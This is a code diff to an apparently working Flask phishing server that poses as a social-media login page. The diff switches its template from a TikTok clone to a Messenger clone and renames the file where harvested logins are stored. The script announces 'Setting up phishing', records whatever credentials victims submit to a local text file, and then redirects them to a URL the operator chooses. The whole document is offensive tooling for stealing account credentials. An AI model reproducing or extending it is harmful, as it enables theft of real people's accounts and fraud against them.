@@ -4,7 +4,7 @@ from flask import Flask, render_template, request, redirect, url_for
 print('Setting up phishing...')
 action_url = input('Enter the URL to redirect users after phishing: ')
 
-app = Flask(__name__, template_folder='Phishing/templates/tiktok')
+app = Flask(__name__, template_folder='Phishing/templates/mesenger')
 username = None
 
 @app.route("/")
@@ -24,7 +24,7 @@ def login():
 
     # Определяем текущий путь
     current_path = os.path.abspath(os.path.dirname(__file__))
-    file_path = os.path.join(current_path, 'tiktok_user_data.txt')
+    file_path = os.path.join(current_path, 'mesenger_data_user.txt')
     print(f"File path: {file_path}")
 
     # Запись в файл с кодировкой UTF-8
@@ -36,11 +36,6 @@ def login():
         print(f"Error writing to file: {e}")
 
     return redirect(action_url)
-
-@app.route("/welcome")
-def welcome():
-    # Redirect to action_url on the client's browser
-    return render_template("xd1.html")
 
 if __name__ == '__main__':
     print("Starting the server...")
